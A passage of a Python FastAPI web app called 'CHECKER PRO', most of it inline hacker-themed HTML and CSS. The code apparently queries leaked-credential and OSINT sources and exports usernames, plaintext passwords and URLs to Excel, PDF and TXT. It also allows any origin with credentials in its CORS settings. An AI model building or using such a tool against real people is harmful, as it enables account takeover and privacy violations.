from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse, FileResponse, StreamingResponse
from fastapi.middleware.cors import CORSMiddleware
import json
import io
from openpyxl import Workbook
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.lib import colors
import asyncio
from playwright.async_api import async_playwright
import sys
import os
import httpx

# Agregar directorio checker al path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from checker.api_client import LeaksyrClient
from checker.osint_integrations import UltimateOSINTClient

# Initialize FastAPI
app = FastAPI()

# Inicializar clientes global
leaksyr_client = None
osint_client = None

@app.on_event("startup")
async def startup():
    global leaksyr_client, osint_client
    try:
        leaksyr_client = LeaksyrClient()
        osint_client = UltimateOSINTClient()
        print("[OK] Leaksyr API Client conectado correctamente")
        print("[OK] ULTIMATE OSINT Multi-Source Client inicializado (50+ APIs)")
    except Exception as e:
        print(f"[ERROR] Error conectando: {e}")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Utility functions
def deduplicate_results(data):
    if not isinstance(data, list):
        return data
    seen = set()
    result = []
    for item in data:
        key = (item.get('username'), item.get('password'), item.get('url'))
        if key not in seen:
            seen.add(key)
            result.append(item)
    return result

def export_to_excel(data):
    wb = Workbook()
    ws = wb.active
    ws.title = "Results"
    
    headers = ['Username', 'Password', 'URL']
    ws.append(headers)
    
    for item in data:
        ws.append([item.get('username', ''), item.get('password', ''), item.get('url', '')])
    
    ws.column_dimensions['A'].width = 30
    ws.column_dimensions['B'].width = 30
    ws.column_dimensions['C'].width = 40
    
    buffer = io.BytesIO()
    wb.save(buffer)
    buffer.seek(0)
    return buffer

def export_to_pdf(data):
    buffer = io.BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=letter)
    elements = []
    
    styles = getSampleStyleSheet()
    title_style = ParagraphStyle(
        'CustomTitle',
        parent=styles['Heading1'],
        fontSize=18,
        textColor=colors.HexColor('#000000'),
        spaceAfter=30,
    )
    elements.append(Paragraph("CHECKER Results", title_style))
    
    table_data = [['Username', 'Password', 'URL']]
    for item in data:
        table_data.append([item.get('username', ''), item.get('password', ''), item.get('url', '')])
    
    table = Table(table_data, colWidths=[2*inch, 2*inch, 2.5*inch])
    table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#1e88e5')),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, 0), 12),
        ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
        ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
        ('GRID', (0, 0), (-1, -1), 1, colors.black)
    ]))
    
    elements.append(table)
    doc.build(elements)
    buffer.seek(0)
    return buffer

def export_to_txt(data):
    text = "CHECKER RESULTS\n"
    text += "=" * 80 + "\n"
    text += f"Total Records: {len(data)}\n"
    text += "=" * 80 + "\n\n"
    
    for idx, item in enumerate(data, 1):
        text += f"{idx}. Username: {item.get('username', '')}\n"
        text += f"   Password: {item.get('password', '')}\n"
        text += f"   URL: {item.get('url', '')}\n"
        text += "-" * 80 + "\n"
    
    return io.BytesIO(text.encode())

@app.get("/", response_class=HTMLResponse)
async def root():
    return """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CHECKER PRO - Search</title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%230f0f1e'/%3E%3Ccircle cx='50' cy='50' r='45' fill='none' stroke='%2339ff14' stroke-width='2'/%3E%3Ctext x='50' y='75' font-size='80' font-weight='bold' font-family='Arial,sans-serif' fill='%2339ff14' text-anchor='middle' style='filter:drop-shadow(0 0 6px %2339ff14);'%3EC%3C/text%3E%3C/svg%3E" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0f0f1e 0%, #1a1a2e 100%);
            color: #e0e0e0;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
            display: flex;
            flex-direction: column;
        }
        
        /* LLUVIA ANIMADA DE CÓDIGO BINARIO Y NÚMEROS - 0101 */
        body::before {
            content: '0 1 0 1 1 0 0 1 0 1 0 0 1 1 0 1 0 1 0 1 1 0 0 1 0 1 0 0 1 1 0 1 0 1 0 1 1 0 0 1 0 1 0 0 1 1 0 1 0 1 0 1 1 0 0 1 0 1 0 0 1 1 0 1 2 3 5 8 7 4 9 6 1 2 3 5 8 7 4 9 6 0 1 0 1 1 0 0 1 0 1 0 0 1 1 0 1 0 1 0 1 1 0 0 1 0 1 0 0 1 1 0 1 0 1 0 1 1 0 0 1 0 1 0 0 1 1 0 1 2 3 5 8 7 4 9 6 1 2 3 5 8 7 4 9 6 0 1 0 1 1 0 0 1 0 1 0 0 1 1 0 1';
            position: fixed;
            top: -100%;
            left: 0;
            width: 100%;
            height: 200%;
            font-family: 'Courier New', monospace;
            font-size: 18px;
            font-weight: bold;
            color: #39ff14;
            text-shadow: 
                0 0 10px rgba(57, 255, 20, 0.8),
                0 0 20px rgba(57, 255, 20, 0.5),
                0 0 30px rgba(57, 255, 20, 0.3);
            white-space: pre-wrap;
            word-wrap: break-word;
            z-index: 0;
            pointer-events: none;
            line-height: 1.8;
            letter-spacing: 8px;
            opacity: 0.7;
            animation: binary-rain 8s linear infinite;
            overflow: hidden;
        }
        
        @keyframes binary-rain {
            0% {
                transform: translateY(-100%) translateX(0px) skew(0deg);
                opacity: 0;
            }
            10% {
                opacity: 0.7;
            }
            45% {
                transform: translateY(50vh) translateX(15px) skew(0.5deg);
                opacity: 0.8;
            }
            90% {
                opacity: 0.7;
            }
            100% {
                transform: translateY(100vh) translateX(0px) skew(0deg);
                opacity: 0;
            }
        }
        
        @keyframes background-distortion {
            0%, 100% {
                filter: hue-rotate(0deg) brightness(1);
            }
            25% {
                filter: hue-rotate(5deg) brightness(1.1);
            }
            50% {
                filter: hue-rotate(0deg) brightness(0.95);
            }
            75% {
                filter: hue-rotate(-3deg) brightness(1.05);
            }
        }
        
        @keyframes background-wave {
            0%, 100% {
                transform: translateY(0px);
            }
            50% {
                transform: translateY(-10px);
            }
        }
        
        /* EFECTO DE GLITCH EN LA LLUVIA CON MÁS DINAMISMO */
        @keyframes glitch {
            0%, 100% { 
                text-shadow: 0 0 10px rgba(57, 255, 20, 0.8), 0 0 20px rgba(57, 255, 20, 0.5);
                filter: hue-rotate(0deg);
            }
            15% { 
                text-shadow: -3px 0 #00ff41, 3px 0 rgba(57, 255, 20, 0.5), 0 0 10px rgba(57, 255, 20, 0.8);
                filter: hue-rotate(8deg);
            }
            30% { 
                text-shadow: 0 0 20px rgba(57, 255, 20, 0.9), 0 0 30px rgba(57, 255, 20, 0.6), -2px -2px #39ff14, 2px 2px rgba(57, 255, 20, 0.4);
                filter: hue-rotate(-5deg);
            }
            50% { 
                text-shadow: 0 0 15px rgba(57, 255, 20, 0.9), 0 0 35px rgba(57, 255, 20, 0.7);
                filter: hue-rotate(0deg);
            }
            70% { 
                text-shadow: 3px 0 #39ff14, -3px 0 rgba(57, 255, 20, 0.5), 0 0 10px rgba(57, 255, 20, 0.8);
                filter: hue-rotate(-8deg);
            }
            85% { 
                text-shadow: 0 2px #00ff41, 0 -2px rgba(57, 255, 20, 0.5), 0 0 15px rgba(57, 255, 20, 0.9);
                filter: hue-rotate(3deg);
            }
        }
        
        body::after {
            content: '1 0 1 0 0 1 1 0 1 0 1 1 0 0 1 0 1 0 1 0 0 1 1 0 1 0 1 1 0 0 1 0 1 0 1 0 0 1 1 0 1 0 1 1 0 0 1 0 1 0 1 0 0 1 1 0 1 0 1 1 0 0 1 0 9 4 7 6 5 2 8 3 9 4 7 6 5 2 8 3 1 0 1 0 0 1 1 0 1 0 1 1 0 0 1 0 1 0 1 0 0 1 1 0 1 0 1 1 0 0 1 0 1 0 1 0 0 1 1 0 1 0 1 1 0 0 1 0 9 4 7 6 5 2 8 3 9 4 7 6 5 2 8 3 1 0 1 0 0 1 1 0 1 0 1 1 0 0 1 0';
            position: fixed;
            top: -150%;
            left: 0;
            width: 100%;
            height: 250%;
            font-family: 'Courier New', monospace;
            font-size: 18px;
            font-weight: bold;
            color: #39ff14;
            text-shadow: 
                0 0 12px rgba(57, 255, 20, 0.9),
                0 0 25px rgba(57, 255, 20, 0.6),
                0 0 40px rgba(57, 255, 20, 0.3);
            white-space: pre-wrap;
            word-wrap: break-word;
            z-index: 0;
            pointer-events: none;
            line-height: 1.8;
            letter-spacing: 8px;
            opacity: 0.6;
            animation: binary-rain 10s linear infinite reverse, background-wave 5s ease-in-out infinite, background-distortion 6s ease-in-out infinite;
            filter: hue-rotate(0deg);
            overflow: hidden;
        }
        
        .navbar {
            background: rgba(20, 20, 35, 0.95);
            backdrop-filter: blur(10px);
            padding: 12px 50px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(57, 255, 20, 0.2);
            position: sticky;
            top: 0;
            z-index: 1000;
            flex-shrink: 0;
        }
        
        .logo {
            font-size: 20px;
            font-weight: 900;
            color: #39ff14;
            letter-spacing: 1px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .nav-right {
            display: flex;
            gap: 12px;
            align-items: center;
        }
        
        .btn-validator {
            background: #39ff14;
            color: black;
            border: none;
            padding: 7px 14px;
            border-radius: 3px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Courier New', monospace;
            font-size: 11px;
        }
        
        .btn-validator:hover {
            transform: scale(1.05);
            box-shadow: 0 0 15px rgba(57, 255, 20, 0.5);
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px 50px 30px 50px;
            position: relative;
            z-index: 10;
            flex: 1;
            width: 100%;
        }
        
        .hero {
            text-align: center;
            margin-bottom: 5px;
        }
        
        .kaomoji {
            font-size: 50px;
            margin-bottom: 3px;
            animation: flicker 0.15s infinite;
            text-shadow: 0 0 30px rgba(57, 255, 20, 0.5);
        }
        
        @keyframes flicker {
            0%, 100% { text-shadow: 0 0 30px rgba(57, 255, 20, 0.5); }
            50% { text-shadow: 0 0 20px rgba(57, 255, 20, 0.3); }
        }
        
        .slogan {
            font-size: 24px;
            font-weight: bold;
            color: white;
            letter-spacing: 2px;
            margin-bottom: 2px;
        }
        
        .search-wrapper {
            background: rgba(17, 24, 39, 0.4);
            border: 1px solid rgba(57, 255, 20, 0.2);
            border-radius: 0px;
            padding: 15px;
            margin-bottom: 15px;
            box-shadow: 0 0 10px rgba(57, 255, 20, 0.1);
        }
        
        .search-form {
            display: flex;
            gap: 8px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }
        
        .field-select, .match-select {
            background: rgba(17, 24, 39, 0.9);
            border: 1px solid rgba(57, 255, 20, 0.4);
            color: #39ff14;
            padding: 12px 15px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        
        .field-select:hover, .match-select:hover {
            border-color: #39ff14;
            box-shadow: 0 0 10px rgba(57, 255, 20, 0.3);
        }
        
        .search-input-wrapper {
            flex: 1;
            min-width: 250px;
            display: flex;
            align-items: center;
            background: transparent;
            border: none;
            border-bottom: 1px solid #39ff14;
            border-radius: 0;
            padding: 0 8px;
            transition: all 0.2s ease;
        }
        
        .search-input-wrapper:focus-within {
            border-color: #39ff14;
            box-shadow: 0 0 15px rgba(57, 255, 20, 0.5);
        }
        
        .search-prompt {
            color: #39ff14;
            font-weight: bold;
            margin-right: 8px;
            font-size: 16px;
        }
        
        .search-input {
            flex: 1;
            background: transparent;
            border: none;
            color: white;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            outline: none;
            padding: 10px 0;
        }}
        
        .search-input::placeholder {
            color: #606060;
        }
        
        .btn-execute {
            background: #39ff14;
            color: black;
            border: none;
            padding: 12px 30px;
            border-radius: 4px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s ease;
            font-family: 'Courier New', monospace;
            display: flex;
            align-items: center;
            gap: 8px;
            white-space: nowrap;
        }
        
        .btn-execute:hover {
            background: #39ff14;
            color: black;
            box-shadow: 0 0 20px rgba(57, 255, 20, 0.6);
            transform: translateY(-2px);
        }
        
        .btn-filters {
            background: rgba(57, 255, 20, 0.1);
            border: 1px solid rgba(57, 255, 20, 0.4);
            color: #39ff14;
            padding: 12px 20px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s ease;
            font-family: 'Courier New', monospace;
        }
        
        .btn-filters:hover {
            border-color: #39ff14;
            box-shadow: 0 0 10px rgba(57, 255, 20, 0.3);
        }
        
        .results-area {
            background: rgba(17, 24, 39, 0.8);
            border: 1px solid rgba(57, 255, 20, 0.2);
            border-radius: 4px;
            padding: 12px;
            min-height: 50px;
            max-height: 500px;
            overflow-y: auto;
            margin-bottom: 10px;
        }

        /* ESTILO HACKER PARA BARRAS DE SCROLL */
        .results-area::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }

        .results-area::-webkit-scrollbar-track {
            background: rgba(17, 24, 39, 0.6);
            border-left: 1px solid rgba(57, 255, 20, 0.1);
        }

        .results-area::-webkit-scrollbar-thumb {
            background: linear-gradient(180deg, rgba(57, 255, 20, 0.8), rgba(57, 255, 20, 0.4));
            border-radius: 5px;
            border: 1px solid #39ff14;
            animation: scroll-glow 1.5s ease-in-out infinite;
        }

        .results-area::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(180deg, #39ff14, rgba(57, 255, 20, 0.8));
            box-shadow: 0 0 10px #39ff14;
        }

        /* Firefox scrollbar */
        .results-area {
            scrollbar-color: rgba(57, 255, 20, 0.7) rgba(17, 24, 39, 0.6);
            scrollbar-width: thin;
        }

        @keyframes scroll-glow {
            0%, 100% {
                box-shadow: 0 0 5px rgba(57, 255, 20, 0.5);
            }
            50% {
                box-shadow: 0 0 15px rgba(57, 255, 20, 0.8);
            }
        }
        
        .result-item {
            background: linear-gradient(135deg, rgba(57, 255, 20, 0.1), rgba(57, 255, 20, 0.05));
            border-left: 4px solid #39ff14;
            border-top: 1px solid rgba(57, 255, 20, 0.3);
            padding: 14px;
            margin-bottom: 12px;
            border-radius: 4px;
            box-shadow: 0 0 10px rgba(57, 255, 20, 0.15);
        }
        
        .result-field {
            color: #39ff14;
            font-size: 13px;
            margin: 6px 0;
            word-break: break-all;
            font-weight: 500;
            line-height: 1.5;
        }

        .result-field strong {
            color: #00ff41;
            font-weight: bold;
            text-shadow: 0 0 8px rgba(57, 255, 20, 0.6);
        }
        
        .export-buttons {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        .btn-export {
            background: rgba(57, 255, 20, 0.2);
            border: 2px solid #39ff14;
            color: #39ff14;
            padding: 12px 18px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s ease;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            box-shadow: 0 0 10px rgba(57, 255, 20, 0.2);
        }

        .btn-export:hover {
            background: #39ff14;
            color: black;
            box-shadow: 0 0 20px rgba(57, 255, 20, 0.8);
            transform: scale(1.05);
        .footer {
            text-align: center;
            padding: 10px 30px;
            border-top: 1px solid rgba(57, 255, 20, 0.2);
            color: #909090;
            font-size: 9px;
            background: rgba(15, 15, 30, 0.95);
            flex-shrink: 0;
            z-index: 5;
        }
        
        .loading {
            text-align: center;
            color: #39ff14;
            padding: 30px;
            animation: loading-pulse 0.8s ease-in-out infinite !important;
            font-size: 16px;
            font-weight: bold;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 15px 15px 30px 15px;
            }
            
            .slogan {
                font-size: 18px;
            }
            
            .kaomoji {
                font-size: 40px;
            }
            
            .search-form {
                flex-direction: column;
            }
            
            .search-input-wrapper {
                min-width: 100%;
            }
            
            .navbar {
                padding: 10px 15px;
            }

            .results-area {
                max-height: 250px;
            }
        }

        /* ═══════════════════════════════════════════════════════════ */
        /* ✦ ANIMACIONES AVANZADAS DE FONDO ✦ */
        /* ═══════════════════════════════════════════════════════════ */

        /* EFECTO DE RUIDO/ESTÁTICO EN EL FONDO */
        @keyframes background-flicker {
            0%, 100% {
                opacity: 0.7;
                filter: brightness(1);
            }
            10% {
                opacity: 0.75;
                filter: brightness(1.05);
            }
            20% {
                opacity: 0.65;
                filter: brightness(0.95);
            }
            30% {
                opacity: 0.8;
                filter: brightness(1.1);
            }
            50% {
                opacity: 0.68;
                filter: brightness(0.98);
            }
            70% {
                opacity: 0.78;
                filter: brightness(1.02);
            }
            85% {
                opacity: 0.72;
                filter: brightness(1.08);
            }
        }

        /* EFECTO DE STREAM DIAGONAL MEJORADO */
        @keyframes diagonal-stream {
            0% {
                transform: translateY(-100%) translateX(-100%) rotate(0deg);
                opacity: 0.2;
            }
            50% {
                opacity: 0.6;
            }
            100% {
                transform: translateY(100vh) translateX(100%) rotate(0deg);
                opacity: 0.2;
            }
        }

        /* PULSO VOLUMÉTRICO DEL FONDO */
        @keyframes volumetric-pulse {
            0%, 100% {
                box-shadow: inset 0 0 0px rgba(57, 255, 20, 0.1);
            }
            50% {
                box-shadow: inset 0 0 40px rgba(57, 255, 20, 0.15);
            }
        }

        /* ANIMACIÓN DE CORRUPCIÓN DE PIXELES */
        @keyframes pixel-corruption {
            0%, 100% {
                clip-path: polygon(0 0, 100% 0, 100% 100%, 0 100%);
            }
            25% {
                clip-path: polygon(0 2%, 100% 0, 100% 98%, 0 100%);
            }
            50% {
                clip-path: polygon(0 0, 98% 1%, 100% 100%, 2% 100%);
            }
            75% {
                clip-path: polygon(1% 0, 100% 3%, 99% 100%, 0 97%);
            }
        }

        /* ABERRACIÓN CROMÁTICA DINÁMICA */
        @keyframes chromatic-aberration {
            0%, 100% {
                filter: drop-shadow(0 0 0 rgba(57, 255, 20, 0));
            }
            25% {
                filter: drop-shadow(1px 0 0 rgba(255, 0, 127, 0.3)) drop-shadow(-1px 0 0 rgba(0, 255, 127, 0.3));
            }
            50% {
                filter: drop-shadow(2px 0 0 rgba(255, 0, 100, 0.2)) drop-shadow(-2px 0 0 rgba(0, 255, 100, 0.2));
            }
            75% {
                filter: drop-shadow(1px 1px 0 rgba(255, 0, 127, 0.25)) drop-shadow(-1px -1px 0 rgba(0, 255, 127, 0.25));
            }
        }

        /* EFECTO DE VOLTAJE/ELECTRICITY */
        @keyframes electrical-surge {
            0%, 100% {
                text-shadow: 
                    0 0 10px rgba(57, 255, 20, 0.8),
                    0 0 20px rgba(57, 255, 20, 0.5);
                filter: hue-rotate(0deg);
            }
            10% {
                text-shadow: 
                    0 0 20px rgba(57, 255, 20, 1),
                    0 0 40px rgba(57, 255, 20, 0.8),
                    inset 0 0 10px rgba(57, 255, 20, 0.4);
                filter: hue-rotate(-10deg);
            }
            20% {
                text-shadow: 
                    0 0 30px rgba(57, 255, 20, 1),
                    0 0 60px rgba(57, 255, 20, 0.7),
                    inset 0 0 15px rgba(57, 255, 20, 0.5);
                filter: hue-rotate(5deg);
            }
            30% {
                text-shadow: 
                    0 0 15px rgba(57, 255, 20, 0.9),
                    0 0 30px rgba(57, 255, 20, 0.5);
                filter: hue-rotate(0deg);
            }
            50% {
                text-shadow: 
                    0 0 25px rgba(57, 255, 20, 0.95),
                    0 0 45px rgba(57, 255, 20, 0.65);
                filter: hue-rotate(-5deg);
            }
            70% {
                text-shadow: 
                    0 0 35px rgba(57, 255, 20, 1),
                    0 0 65px rgba(57, 255, 20, 0.8);
                filter: hue-rotate(8deg);
            }
            85% {
                text-shadow: 
                    0 0 20px rgba(57, 255, 20, 0.9),
                    0 0 35px rgba(57, 255, 20, 0.6);
                filter: hue-rotate(0deg);
            }
        }

        /* APLICAR TODOS LOS EFECTOS A LAS CAPAS DE FONDO */
        body::before {
            animation: binary-rain 8s linear infinite, background-distortion 4s ease-in-out infinite, background-flicker 0.15s ease-in-out infinite, plasma-energy 3s ease-in-out infinite, energy-pulse-global 2.5s ease-in-out infinite, chromatic-aberration 4s ease-in-out infinite, electrical-surge 5s ease-in-out infinite !important;
        }

        body::after {
            animation: binary-rain 10s linear infinite reverse, background-wave 5s ease-in-out infinite, background-distortion 6s ease-in-out infinite, plasma-energy 4s ease-in-out infinite reverse, energy-pulse-global 3s ease-in-out infinite, chromatic-aberration 5s ease-in-out infinite reverse, electrical-surge 6s ease-in-out infinite reverse !important;
        }

        /* ═══════════════════════════════════════════════════════════ */
        /* ✦ ANIMACIONES HACKER PRO ✦ */
        /* ═══════════════════════════════════════════════════════════ */

        /* ESCANEO HORIZONTAL - Línea que baja continuamente */
        @keyframes scanline {
            0% { top: -100%; }
            100% { top: 100%; }
        }

        body::before {
            animation: scanline 8s linear infinite, binary-rain 8s linear infinite;
        }

        /* Línea de escaneo visible */
        .container::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #39ff14, transparent);
            animation: scanline 6s linear infinite;
            z-index: 999;
            pointer-events: none;
        }

        /* PULSACIÓN DE BRILLO EN BORDES */
        @keyframes pulse-glow {
            0%, 100% { 
                box-shadow: 0 0 5px rgba(57, 255, 20, 0.3), 
                           0 0 10px rgba(57, 255, 20, 0.2),
                           inset 0 0 20px rgba(57, 255, 20, 0.05);
            }
            50% { 
                box-shadow: 0 0 20px rgba(57, 255, 20, 0.6),
                           0 0 40px rgba(57, 255, 20, 0.3),
                           inset 0 0 30px rgba(57, 255, 20, 0.1);
            }
        }

        /* Aplicar pulsación a áreas importantes */
        .search-wrapper {
            animation: pulse-glow 3s ease-in-out infinite;
        }

        .results-area {
            animation: pulse-glow 4s ease-in-out infinite;
        }

        /* EFECTO DE GLITCH MEJORADO */
        @keyframes glitch-extreme {
            0% { 
                text-shadow: -2px 0 #39ff14, 2px 0 rgba(57, 255, 20, 0.5);
                transform: translateX(0);
            }
            20% { 
                text-shadow: -3px 0 #00ff41, 3px 0 rgba(57, 255, 20, 0.6);
                transform: translateX(-2px);
            }
            40% { 
                text-shadow: 2px 0 #39ff14, -2px 0 rgba(57, 255, 20, 0.5);
                transform: translateX(2px);
            }
            60% { 
                text-shadow: -2px 0 #00ff41, 2px 0 rgba(57, 255, 20, 0.6);
                transform: translateX(-1px);
            }
            80% { 
                text-shadow: 3px 0 #39ff14, -3px 0 rgba(57, 255, 20, 0.5);
                transform: translateX(1px);
            }
            100% { 
                text-shadow: -2px 0 #39ff14, 2px 0 rgba(57, 255, 20, 0.5);
                transform: translateX(0);
            }
        }

        .slogan {
            animation: glitch-extreme 4s infinite !important;
            position: relative;
        }

        /* DESTELLO DE ESQUINAS */
        @keyframes corner-flash {
            0%, 100% { opacity: 0; }
            50% { opacity: 0.5; }
        }

        .search-wrapper::before,
        .search-wrapper::after,
        .results-area::before,
        .results-area::after {
            content: '';
            position: absolute;
            width: 20px;
            height: 20px;
            border: 2px solid #39ff14;
            opacity: 0.3;
            animation: corner-flash 2s ease-in-out infinite;
        }

        .search-wrapper::before { top: -10px; left: -10px; border-right: none; border-bottom: none; }
        .search-wrapper::after { top: -10px; right: -10px; border-left: none; border-bottom: none; }

        /* BRILLO EN HOVER DE BOTONES */
        @keyframes button-glow {
            0%, 100% { 
                box-shadow: 0 0 5px rgba(57, 255, 20, 0.4),
                           0 0 15px rgba(57, 255, 20, 0.2),
                           inset 0 0 10px rgba(57, 255, 20, 0.1);
            }
            50% { 
                box-shadow: 0 0 15px rgba(57, 255, 20, 0.8),
                           0 0 30px rgba(57, 255, 20, 0.5),
                           inset 0 0 20px rgba(57, 255, 20, 0.2);
            }
        }

        .btn-execute {
            position: relative;
            transition: all 0.3s ease;
        }

        .btn-execute:hover {
            animation: button-glow 0.6s ease-in-out;
        }

        .btn-filters:hover {
            animation: button-glow 0.6s ease-in-out;
        }

        .btn-export:hover {
            animation: button-glow 0.6s ease-in-out;
        }

        /* EFECTO DE FUEGO EN TEXTO */
        @keyframes neon-flicker {
            0%, 100% {
                text-shadow: 
                    0 0 10px #39ff14,
                    0 0 20px #39ff14,
                    0 0 30px #39ff14,
                    0 0 40px rgba(57, 255, 20, 0.8);
            }
            20% {
                text-shadow: 
                    0 0 20px #39ff14,
                    0 0 40px #39ff14,
                    0 0 60px #39ff14,
                    0 0 80px rgba(57, 255, 20, 0.8);
            }
            40% {
                text-shadow: 
                    0 0 5px #39ff14,
                    0 0 10px #39ff14;
            }
            60% {
                text-shadow: 
                    0 0 15px #39ff14,
                    0 0 30px #39ff14,
                    0 0 50px #39ff14;
            }
            80% {
                text-shadow: 
                    0 0 8px #39ff14,
                    0 0 16px #39ff14;
            }
        }

        .logo {
            animation: neon-flicker 2.5s ease-in-out infinite;
        }

        /* EFECTO DE MATRIZ EN ENTRADA */
        @keyframes matrix-input {
            0% {
                background-color: rgba(17, 24, 39, 0.9);
                box-shadow: 0 0 5px rgba(57, 255, 20, 0.2);
            }
            50% {
                background-color: rgba(57, 255, 20, 0.05);
                box-shadow: 0 0 15px rgba(57, 255, 20, 0.4),
                           inset 0 0 10px rgba(57, 255, 20, 0.1);
            }
            100% {
                background-color: rgba(17, 24, 39, 0.9);
                box-shadow: 0 0 5px rgba(57, 255, 20, 0.2);
            }
        }

        .search-input-wrapper:focus-within {
            animation: matrix-input 0.8s ease-in-out infinite;
        }

        /* EFECTO DE CURSOR TERMINAL */
        @keyframes cursor-blink {
            0%, 49% { opacity: 1; }
            50%, 100% { opacity: 0; }
        }

        input[type="text"]::placeholder {
            color: rgba(57, 255, 20, 0.4);
        }

        /* DISTORSIÓN DIGITAL */
        @keyframes distortion {
            0% { filter: skew(0deg); }
            25% { filter: skew(-1deg); }
            50% { filter: skew(0deg); }
            75% { filter: skew(1deg); }
            100% { filter: skew(0deg); }
        }

        .result-item {
            transition: all 0.3s ease;
        }

        .result-item:hover {
            animation: distortion 0.4s ease-in-out;
            transform: translateX(5px);
            box-shadow: 0 0 20px rgba(57, 255, 20, 0.4),
                       inset 0 0 10px rgba(57, 255, 20, 0.1);
        }

        /* LLUVIA DE PARTICULAS (Efecto diagonal) */
        @keyframes diagonal-rain {
            0% {
                transform: translateY(-100%) translateX(-50%);
                opacity: 0;
            }
            10% {
                opacity: 0.7;
            }
            90% {
                opacity: 0.7;
            }
            100% {
                transform: translateY(100vh) translateX(50%);
                opacity: 0;
            }
        }

        /* EFECTO DE CARGA DIGITAL */
        @keyframes loading-pulse {
            0% { 
                opacity: 0.3;
                transform: scale(0.8);
            }
            50% { 
                opacity: 1;
                transform: scale(1);
            }
            100% { 
                opacity: 0.3;
                transform: scale(0.8);
            }
        }

        .loading {
            animation: loading-pulse 0.8s ease-in-out infinite !important;
        }

        /* EFECTO DE VOLTEO DE TARJETA */
        @keyframes card-flip {
            0%, 100% { transform: rotateX(0deg); }
            50% { transform: rotateX(10deg); }
        }

        .result-item {
            perspective: 1000px;
        }

        .result-item:hover {
            animation: card-flip 0.6s ease-in-out;
        }

        /* LÍNEAS DECORATIVAS ANIMADAS */
        @keyframes line-sweep {
            0% {
                width: 0;
                opacity: 1;
            }
            50% {
                opacity: 1;
            }
            100% {
                width: 100%;
                opacity: 0;
            }
        }

        .search-wrapper::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, #39ff14, transparent);
            animation: line-sweep 1.5s ease-in-out infinite;
        }

        /* EFECTO HOLOGRÁFICO EN NAVBAR */
        @keyframes hologram {
            0%, 100% {
                filter: brightness(1);
                text-shadow: 0 0 10px #39ff14;
            }
            50% {
                filter: brightness(1.2) hue-rotate(10deg);
                text-shadow: 0 0 20px #39ff14, 0 0 30px rgba(57, 255, 20, 0.8);
            }
        }

        .navbar {
            animation: hologram 3s ease-in-out infinite;
        }

        /* ONDA DE ENERGÍA EN BORDES */
        @keyframes wave-energy {
            0% {
                border-color: rgba(57, 255, 20, 0.2);
                box-shadow: 0 0 5px rgba(57, 255, 20, 0.1);
            }
            50% {
                border-color: rgba(57, 255, 20, 0.8);
                box-shadow: 0 0 20px rgba(57, 255, 20, 0.5),
                           inset 0 0 15px rgba(57, 255, 20, 0.2);
            }
            100% {
                border-color: rgba(57, 255, 20, 0.2);
                box-shadow: 0 0 5px rgba(57, 255, 20, 0.1);
            }
        }

        .results-area {
            animation: wave-energy 2s ease-in-out infinite;
        }

        /* EFECTO DE ESCRITURA DE TERMINAL */
        .slogan {
            position: relative;
        }

        .slogan::after {
            content: '█';
            animation: cursor-blink 1s infinite;
            margin-left: 5px;
        }

        /* BRILLO DINÁMICO MÚLTIPLE */
        @keyframes multi-glow {
            0%, 100% {
                filter: drop-shadow(0 0 5px rgba(57, 255, 20, 0.4)) 
                        drop-shadow(0 0 10px rgba(57, 255, 20, 0.2));
            }
            50% {
                filter: drop-shadow(0 0 15px rgba(57, 255, 20, 0.8)) 
                        drop-shadow(0 0 25px rgba(57, 255, 20, 0.4));
            }
        }

        .field-select {
            animation: multi-glow 2s ease-in-out infinite;
        }

